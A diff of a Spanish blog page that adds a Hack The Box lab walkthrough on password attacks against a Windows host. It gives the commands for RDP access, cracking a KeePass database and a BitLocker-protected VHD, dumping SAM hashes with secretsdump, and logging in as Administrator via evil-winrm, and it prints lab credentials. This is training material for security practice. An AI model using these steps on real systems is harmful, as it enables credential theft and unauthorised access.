@@ -15,11 +15,11 @@
 
 
 <meta name="description" content="
-    Enunciado El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso.
+    Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.
     "
 />
 <meta property="og:description" content="
-    Enunciado El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso.
+    Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.
     " 
 />
 
@@ -38,15 +38,15 @@
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Laboratorio de Ataques de Contraseña - Díficil">
-  <meta name="twitter:description" content="Enunciado El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso.">
+  <meta name="twitter:description" content="Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.">
 
 
   <meta itemprop="name" content="Laboratorio de Ataques de Contraseña - Díficil">
-  <meta itemprop="description" content="Enunciado El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso.">
+  <meta itemprop="description" content="Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM.">
   <meta itemprop="datePublished" content="2025-06-02T00:00:00+00:00">
   <meta itemprop="dateModified" content="2025-06-02T00:00:00+00:00">
-  <meta itemprop="wordCount" content="287">
-  <meta itemprop="keywords" content="Hack the Box,Password Cracking">
+  <meta itemprop="wordCount" content="656">
+  <meta itemprop="keywords" content="Hackthebox,SMB,RDP,Keepass,Webshell,Bitlocker,Vhd,Dislocker,Evilwinrm">
 
 
 
@@ -302,10 +302,37 @@
 </span>
                             &centerdot;
                             <span class="time-to-read">
-    2 mins read</span>
+    4 mins read</span>
                         </div>
 
                         <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/smb"><span
+                                    class="tag bg-dark">smb</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/rdp"><span
+                                    class="tag bg-dark">rdp</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/keepass"><span
+                                    class="tag bg-dark">keepass</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/webshell"><span
+                                    class="tag bg-dark">webshell</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/bitlocker"><span
+                                    class="tag bg-dark">bitlocker</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/vhd"><span
+                                    class="tag bg-dark">vhd</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/dislocker"><span
+                                    class="tag bg-dark">dislocker</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/evilwinrm"><span
+                                    class="tag bg-dark">evilwinrm</span></a>
                             
                         </div>
                     </div>
@@ -314,7 +341,7 @@
                 
 
                 <h4 id="enunciado">Enunciado</h4>
-<p>El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso. Mientras nuestros compañeros estaban ocupados con otros hosts de la red, descubrimos que el usuario <code>Johanna</code>está presente en muchos hosts. Sin embargo, aún no hemos podido determinar el motivo exacto de esto.</p>
+<p>El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso. Mientras nuestros compañeros estaban ocupados con otros hosts de la red, descubrimos que el usuario <code>Johanna</code> está presente en muchos hosts. Sin embargo, aún no hemos podido determinar el motivo exacto de esto.</p>
 <p>De entrada nos están dando un posible usuario, más adelante vemos donde lo podemos usar.</p>
 <h4 id="enumeración-de-puertos"><strong>Enumeración de puertos</strong></h4>
 <p>Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.</p>
@@ -333,7 +360,66 @@ Hacemos un ataque de fuerza bruta sobre ese servicio de la siguiente forma:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //10.129.67.26/ -U Johanna
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#password</span>
 </span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient1.png" alt=""></p>
-<p>Vemos que hay un recurso david el cual intentamos listar pero con el usuario <code>johanna</code> no tenemos los permisos para ver nada.</p>
+<p>Vemos que hay un recurso <code>david</code> el cual intentamos listar pero con el usuario <code>johanna</code> no tenemos los permisos para ver nada.</p>
+<p>Con las credenciales del usuario <code>johanna</code> podemos acceder por <code>rdp</code> a su escritorio</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xfreerdp3  /v:&lt;IP&gt; /u:johanna /p:<span style="color:#e6db74">&#39;1231234!&#39;</span> 
+</span></span></code></pre></div><p>Y vemos que en el directorio Documents hay un archivo del keepass, nos lo copiamos para local para trabajarlo más cómodo.
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp.png" alt=""></p>
+<p>Nos vamos a instalar una herramienta para montar un servidor web sencillo y subir el archivo desde windows a nuestra máquina Linux.
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp1.png" alt="">
+Nos lo instalamos así y procedemos a usarlo:
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp2.png" alt="">
+En la máquina windows ponemos en el navegador <code>http://&lt;IP&gt;:8000</code> accedemos a la primera opción (File Upload) y subimos el archivo.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp3.png" alt="">
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp4.png" alt=""></p>
+<p>Luego vamos al directorio donde nos descarga el archivo y le ejecutamos el siguiente comando para intentar crackear la contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>keepass2john Logins.kdbx &gt; keepas.hash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_password.list keepas.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/john1.png" alt=""></p>
+<p>Procedemos a entrar al archivo Logins.kdbx</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp5.png" alt=""></p>
+<p>Tenemos <code>david:gRzX7YbeTcDG7</code></p>
+<p>Recordemos que en el puerto 445 esta corriendo un smb donde hay un recurso llamado david al que ahora podemos intentar acceder</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //&lt;IP&gt;/david -U david --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=SMB2&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient2.png" alt=""></p>
+<p>Y vemos que tenemos un archivo backup.vhd
+Nos lo bajamos para trabajarlo en local(se demora un poco en bajarse porque pesa como 130 mb)</p>
+<p>Ahora con la herramienta bitlocker2john vamos a extraer los hashes para intentar crackearlos con las wordlists posteriormente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bitlocker2john -i Backup.vhd &gt; backup.hashes
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker1.png" alt=""></p>
+<p>Dentro de los hashes seleccionamos el de <code>bitlocker</code>:</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker2.png" alt=""></p>
+<p>Procedemos a crackear el hash con la <code>mut_password</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">22100</span> backup.hash /.../mut_password.list -o backup.cracked
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker3.png" alt=""></p>
+<p>Con el archivo ya crakeado procedemos a</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker4.png" alt=""></p>
+<p>Vamos a montar el Backup.vhd como un dispositovo de almacenamiento para intentar acceder a los datos que en el se almacenan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo losetup --partscan --find --show Backup.vhd
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup1.png" alt="">
+Luego vemos que en slot 5 esta la partición de datos donde debe estar la información.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mmls Backup.vhd
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup2.png" alt="">
+Desbloqueamos el disco utilizando la contraseña que crakeamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dislocker -V /dev/loop9p2 -u123456789! -- /mnt/bitlocker
+</span></span></code></pre></div><p>Montamos el volumen que <code>dislocker</code> crea:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /mnt/bitlocker
+</span></span><span style="display:flex;"><span>mkdir /mnt/bitlocker_mount
+</span></span><span style="display:flex;"><span>sudo mount -o loop /mnt/bitlocker/dislocker-file /mnt/bitlocker_mount
+</span></span></code></pre></div><p>Y vemos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /mnt/bitlocker_mount
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker5.png" alt=""></p>
+<p>Copiamos la linea de administrator para una archivo yo le puse adm.hash y le pasamos el john para crackerar el hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_passwd.list adm.hash --format<span style="color:#f92672">=</span>NT
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd.png" alt=""></p>
+<p>Ya con las credenciales de Administrator podemos usar evilwinrm y acceder a la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i &lt;IP&gt; -u Administrator
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p>Y nos movemos al directorio indicado.
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd2.png" alt=""></p>
 <p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
 
 
